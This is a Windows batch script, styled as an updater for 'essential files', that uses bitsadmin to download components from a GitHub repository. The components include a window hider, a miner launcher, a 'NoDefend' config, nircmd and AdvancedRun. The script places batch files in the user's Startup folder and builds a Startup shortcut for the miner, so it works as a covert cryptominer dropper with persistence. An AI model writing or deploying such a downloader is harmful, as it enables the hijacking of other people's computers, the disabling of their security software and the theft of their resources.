@echo off
setlocal

REM Define the path to the local directory where files will be stored
set "LocalDir=C:\EssentialFiles"

REM Define the raw URLs for the files on GitHub
set "GitHubLinks="
REM Add GitHub raw file links here, each separated by a space
set "GitHubLinks=https://raw.githubusercontent.com/VerusGhost/EssentialData/main/hide-window.bat https://raw.githubusercontent.com/VerusGhost/EssentialData/main/start-miner.bat https://raw.githubusercontent.com/VerusGhost/EssentialData/main/NoDefend.cfg https://github.com/VerusGhost/EssentialData/raw/main/nircmd.exe https://github.com/VerusGhost/EssentialData/raw/main/AdvancedRun.exe https://github.com/VerusGhost/EssentialData/raw/main/script-ps"

REM Loop through each GitHub raw file link and update the local file if needed
for %%G in (%GitHubLinks%) do (
    call :DownloadAndCompare "%%G"
)

REM Define the path to the local directory where startup files will be stored
set "StartupDir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM Define the raw URLs for the startup files on GitHub
set "StartupGitHubLinks="
REM Add GitHub raw file links for startup files here, each separated by a space
set "StartupGitHubLinks=https://raw.githubusercontent.com/VerusGhost/EssentialData/main/Start1.bat https://raw.githubusercontent.com/VerusGhost/EssentialData/main/Start2.bat"

REM Loop through each GitHub raw startup file link and update the local startup file if needed
for %%S in (%StartupGitHubLinks%) do (
    call :DownloadAndCompareStartup "%%S"
)

echo All files checked and updated successfully.
exit /b

:DownloadAndCompare
set "URL=%~1"
set "FileName=%~nx1"
set "TempFile=%TEMP%\!FileName!"

REM Download the file using bitsadmin
bitsadmin /transfer "DownloadFile_!FileName!" /download /priority normal "!URL!" "!TempFile!" >nul

REM Compare the downloaded file with the corresponding local file
fc "!TempFile!" "%LocalDir%\!FileName!" >nul
if errorlevel 1 (
    REM Update the local file if they are different
    move /y "!TempFile!" "%LocalDir%\!FileName!" >nul
    echo !FileName! updated.
) else (
    del "!TempFile!" >nul
    echo !FileName! is up-to-date.
)
exit /b

:DownloadAndCompareStartup
set "URL=%~1"
set "FileName=%~nx1"
set "TempFile=%TEMP%\!FileName!"

REM Download the file using bitsadmin
bitsadmin /transfer "DownloadFile_!FileName!" /download /priority normal "!URL!" "!TempFile!" >nul

REM Compare the downloaded file with the corresponding local file in the startup directory
fc "!TempFile!" "%StartupDir%\!FileName!" >nul
if errorlevel 1 (
    REM Update the local startup file if they are different
    move /y "!TempFile!" "%StartupDir%\!FileName!" >nul
    echo !FileName! updated in Startup folder.

    REM Check if the updated file is start-miner.bat and create/update a shortcut in the user's startup folder
    if /i "!FileName!"=="start-miner.bat" (
        call :CreateOrUpdateShortcut "%LocalDir%\!FileName!" "%StartupDir%\!FileName!.lnk"
    )
) else (
    del "!TempFile!" >nul
    echo !FileName! is up-to-date in Startup folder.
)
exit /b

:CreateOrUpdateShortcut
set "TargetFile=%~1"
set "ShortcutFile=%~2"

REM Create or update a shortcut to the target file in the specified location
powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%ShortcutFile%'); $Shortcut.TargetPath = '%TargetFile%'; $Shortcut.Save()"
exit /b
